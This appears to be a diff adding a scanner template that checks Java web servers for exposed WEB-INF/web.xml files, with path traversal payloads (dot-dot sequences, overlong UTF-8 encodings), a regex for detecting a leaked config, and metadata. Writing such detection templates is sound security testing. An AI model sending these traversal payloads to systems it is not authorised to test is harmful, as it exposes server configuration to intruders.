@@ -1,0 +1,37 @@
+generate:
+  - payload:
+    - "WEB-INF/web.xml"
+    - "WEB-INF/./web.xml"
+    - "WEB-INF/.../web.xml"
+    - "WEB-INF/././web.xml"
+    - "WEB-INF/../../WEB-INF/web.xml"
+    - "WEB-INF/../../../WEB-INF/web.xml"
+    - "WEB-INF/./xxx/../web.xml"
+    - "WEB-INF/./xxx/yyy/../../web.xml"
+    - "../WEB-INF/web.xml"
+    - "../../../../WEB-INF/web.xml"
+    - "../../WEB-INF/web.xml"
+    - "../WEB-INF/web.xml;x="
+    - "../../WEB-INF/web.xml;x="
+    - "../../../WEB-INF/web.xml;x="
+    - "%c0%ae/WEB-INF/web.xml"
+    - "%c0%ae/%c0%ae/WEB-INF/web.xml"
+    - "%c0%ae/%c0%ae/%c0%ae/WEB-INF/web.xml"
+
+detect:
+  - response:
+    - body: '<web-app[\w\W]+<\/web-app>'
+    #- body: '<web-app[\w\W]+<servlet>[\w\W]+<\/servlet>[\w\W]+<\/web-app>'
+
+meta-info:
+  - title: "Java web.xml information leakage vulnerability"
+  - description: "WEB-INF directory may be accessed by external users because of improper configuration, resulting in the leakage of configuration information."
+  - type: info
+  - threat: 20
+  - tags:
+    - Information Exposure
+    - Java
+    - web-inf
+    - tomcat
+    - JBoss
+    - J2EE
